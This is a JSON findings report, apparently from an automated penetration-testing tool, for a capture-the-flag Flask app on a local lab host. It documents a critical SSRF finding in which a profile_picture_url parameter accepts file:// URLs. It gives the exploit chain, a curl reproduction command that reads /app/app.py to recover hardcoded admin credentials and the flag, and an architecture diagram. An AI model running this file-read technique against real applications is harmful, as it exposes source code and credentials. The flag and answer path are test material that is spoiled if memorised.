@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T22:10:27.933786+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "dfbd0f95-8b37-4f0e-b164-537c67035cc9",
+      "timestamp": "2026-04-12T22:10:27.933669+00:00",
+      "title": "CTF Flag Captured via SSRF + Local File Read (file:// Protocol)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:53595",
+      "description": "The Flask application exposes a profile_picture_url parameter that fetches URLs using Python's urllib.request.urlretrieve(), which supports the file:// protocol. This allowed reading arbitrary local files including the application source code (/app/app.py). The source code revealed: (1) hardcoded admin credentials (admin:adminpass), (2) Flask secret key ('supersecretkey'), (3) the flag displayed on the admin profile page. The /reset_password endpoint (localhost-only) was the intended exploit path via SSRF, but direct file:// access provided a shorter path to the flag.",
+      "evidence": "FLAG: flag{335dd283-b8ce-4c22-b1d1-245c3f032575}\n\nExploit chain:\n1. Register user 'attacker' at /register\n2. Login and get session cookie\n3. POST /profile with profile_picture_url=file:///app/app.py\n4. File saved to /static/uploads/app.py, readable publicly\n5. Source reveals admin:adminpass and flag value\n6. Login as admin -> flag shown on profile page\n\nSource code key lines:\n  app.secret_key = 'supersecretkey'\n  users = {'admin': {'password': 'adminpass', ...}}\n  FLAG = 'flag{335dd283-b8ce-4c22-b1d1-245c3f032575}'\n  urllib.request.urlretrieve(profile_picture_url, ...)  # no file:// filtering",
+      "tool_used": "http_request + kali curl",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -H 'Cookie: session=<attacker-session>' -X POST http://172.17.0.1:53595/profile -F 'profile_picture_url=file:///app/app.py' && curl http://172.17.0.1:53595/static/uploads/app.py",
+        "expected": "Flask source code with hardcoded credentials and flag"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "d4a24238-43ef-473f-93dc-256e7df8bec7",
+      "timestamp": "2026-04-12T22:10:45.547588+00:00",
+      "title": "Synthwave User Portal - Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Login[\"/login POST\"]\n  Browser --> Register[\"/register POST\"]\n  Browser --> Profile[\"/profile GET/POST\"]\n  Browser --> Logout[\"/logout\"]\n  Profile --> SSRF[\"urllib.request.urlretrieve\\nprofile_picture_url param\"]\n  SSRF --> FileRead[\"file:// Protocol\\nLocal File Read\"]\n  FileRead --> AppPy[\"/app/app.py\\nSource Code\"]\n  AppPy --> Creds[\"admin:adminpass\\n+ Flask secret key\"]\n  AppPy --> Flag[\"FLAG in source code\"]\n  Creds --> AdminLogin[\"Login as admin\"]\n  AdminLogin --> AdminProfile[\"/profile - admin view\\nShows FLAG\"]\n  ResetPwd[\"/reset_password GET\\nlocalhost-only\"] --> UsersDict[\"In-memory users dict\"]\n  SSRF -.->|\"SSRF attempt blocked\\ndeadlock\"| ResetPwd\n  Profile --> UsersDict\n  Login --> UsersDict\n  Register --> UsersDict"
+    }
+  ]
+}
